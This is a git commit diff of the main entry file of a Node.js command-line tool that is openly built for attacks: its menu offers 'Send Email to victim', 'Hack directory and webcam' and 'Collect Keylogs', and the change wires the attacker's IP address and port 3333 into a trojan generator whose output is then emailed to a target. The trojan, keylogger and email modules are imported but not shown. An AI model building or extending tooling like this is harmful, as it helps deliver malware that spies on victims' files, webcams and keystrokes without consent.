caf934700b7d8a2d3b25d5d076e81d86a1529ba7
Chad <chadoliver017@gmail.com>
2020-12-06 20:11:49 -0500

    email update

--- src/index.js
+++ src/index.js
@@ -2,50 +2,45 @@ const inquirer = require("inquirer");
 const { exec } = require("child_process");
 const directoryHack = require("./Directory_Hack");
 const keyLogger = require("./Keylogger");
-const emailService = require("./Email_Service");
+const emailService = require("./helpers/Email_Service");
 const Q = require("q");
-const { openConsole } = require("./OpenMsfConsole");
+const { getIp } = require("./helpers/Get_Ip_Address");
+const deferred = Q.defer();
+const { emailPrompt } = require("./helpers/Email_Service");
 
 // TODO Program should set parameters and open clien within terminal
-const emailPrompt = () =>{
-  inquirer
-  .prompt([
-    {
-      type: "input",
-      message: "Enter the victim's email address",
-      name: "email",
-    },
-  ])
-  .then((answers) => {
-    emailService.send(answers.email);
-    main();
-  });
-}
 
 const main = () => {
-  const deferred = Q.defer();
-
   inquirer
     .prompt([
       {
         type: "list",
         message: "Choose the action you wish to take",
         name: "action",
-        choices: ["Hack directory and webcam", "Collect Keylogs"],
+        choices: ["Send Email to victim","Hack directory and webcam", "Collect Keylogs"],
       },
     ])
     .then((answers) => {
       if (answers.action === "Hack directory and webcam") {
-        directoryHack.createTrojan(exec, Q).then((result) => {
-          console.log("here");
-          openConsole(exec, inquirer);
+        let port = "3333";
+        getIp(deferred).then((ip) => {
+          const address = { ip, port };
+          console.log("   Using ip", ip);
+          console.log("   Using port", port);
+              directoryHack.createTrojan(exec, Q, address).then(() => {
+              emailPrompt(address);
+            });
+         
         });
+
       } else if (answers.action === "Collect Keylogs"){
         keyLogger.hack(exec);
-        emailService.send(exec);
-      }
+      } else if (answers.action == "Send Email to victim"){
+        emailService.sendEmail();
 
+      }
     });
 };
 
-emailPrompt();
+main();
+
